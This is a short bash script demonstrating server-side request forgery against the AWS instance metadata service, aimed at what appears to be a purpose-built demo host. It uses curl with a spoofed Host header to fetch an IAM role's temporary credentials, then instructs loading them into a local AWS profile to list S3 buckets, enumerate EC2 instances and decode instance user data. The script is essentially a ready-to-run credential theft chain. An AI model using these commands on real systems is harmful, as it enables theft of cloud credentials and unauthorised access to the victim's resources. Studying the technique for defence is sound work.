#!/bin/bash

# Ref: https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/

URL=ssrfdemo.getserverless.com.au
curl -s http://${URL}/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo
# output e.g.
# SSRFDEMO-ISRM-WAF-ROLE

curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/SSRFDEMO-ISRM-WAF-ROLE -H 'Host:169.254.169.254';echo
# output e.g.
#{
#  "Code": ...,
#  "AccessKeyId": ...,
#  "Token": ...,
#}

# Copy these to your credential file
# aws_access_key_id =
# aws_secret_access_key =
# aws_session_token =

# Now you can access the underlying resources that the EC2 can access, e.g.
aws s3 ls

# Get instance ids
aws ec2 describe-instances --query 'Reservations[*].Instances[*]'

# Get user data
aws ec2 describe-instance-attribute --instance-id <instance id> --attribute userData --region <region>

echo <user data> | base64 --decode
